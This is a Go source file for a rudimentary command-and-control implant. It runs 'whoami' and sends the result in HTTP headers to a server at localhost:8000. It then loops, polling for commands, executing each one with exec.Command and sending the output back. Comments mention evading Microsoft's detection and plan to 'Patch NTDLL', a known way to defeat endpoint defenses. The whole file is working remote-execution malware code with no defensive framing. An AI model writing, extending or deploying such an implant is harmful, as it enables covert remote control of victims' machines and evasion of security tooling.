package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"uuid"
)

func main() {
	// to do
	// generate random uuid of numbers/letters [all done]
	// add a user agent with http.requests [all done]
	// execute out from http request [all done]
	// Patch NTDLL
	uuidWithHyphen := uuid.New()
	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
	// Construct the client for requests, we define nothing right now but in the future can add functionality
	client := http.Client{}
	sb1 := "whoami"

	cmd := exec.Command(sb1)
	// Consider adding here logic to execute these commands under a new process or a child process to avoid crashing the main program if the command errors

	result, _ := cmd.Output()
	toSend := string(result)
	toSend = strings.Replace(toSend, "\n", "", -1)
	fmt.Printf(toSend)

	//time.Sleep(10)
	req, err := http.NewRequest("GET", "http://localhost:8000/", nil)
	req.Header = http.Header{"APPSESSIONID": {uuid},"Res": {toSend},"User-Agent": {"testing testing"}}
	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
	for true {
		// current issue is that we're not retrieving and executing the new ocmmand 
		req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
		req.Header.Add("APPSESSIONID", uuid)
		resp, err = client.Do(req)
		body, err := ioutil.ReadAll(resp.Body)
		statusC := resp.Status
		if err != nil {
			log.Fatalln(err)
		}

		//Convert the body to type string
		sb := string(body)
		for sb == "0"{
			time.Sleep(2 * time.Second)
			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, err = client.Do(req)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln(err)
			}
			sb = string(body)
		}
		// This is trying to fix the issue of getting 500 status codes
		// when the DB is cleared
		// 
		statusC = string(statusC)
		fmt.Printf(statusC)
		for statusC == "500"{
			time.Sleep(2 * time.Second)
			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, err = client.Do(req)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln(err)
			}
			sb = string(body)
			statusC = resp.Status
		}
		fmt.Printf(sb)

		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
		sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
		cmd := exec.Command(sb1)

		result, _ := cmd.Output()
		toSend := string(result)
		toSend = strings.Replace(toSend, "\n", "", -1)
		fmt.Printf(toSend)

		time.Sleep(2 * time.Second)
		req, err = http.NewRequest("GET", "http://localhost:8000/schema", nil)
		req.Header = http.Header{"APPSESSIONID": {uuid},"Res": {toSend},"User-Agent": {"testing testing"}}
		resp, err = client.Do(req)
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()
	}

}